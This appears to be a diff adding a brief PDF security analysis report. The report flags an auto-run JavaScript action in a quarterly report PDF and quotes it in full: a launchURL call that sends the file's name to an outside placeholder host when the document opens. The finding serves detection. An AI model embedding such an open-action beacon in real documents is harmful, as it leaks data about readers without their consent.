@@ -1,0 +1,6 @@
+PDF Security Analysis Report:
+File: quarterly_report_Q4.pdf
+Suspicious JavaScript action detected on page open:
+  /OpenAction << /S /JavaScript /JS (app.launchURL('https://tracking.example/open?d='+this.documentFileName)) >>
+Auto-execute URL launch on document open. May exfiltrate filename to external server.
+Severity: HIGH — JavaScript action with external URL reference.
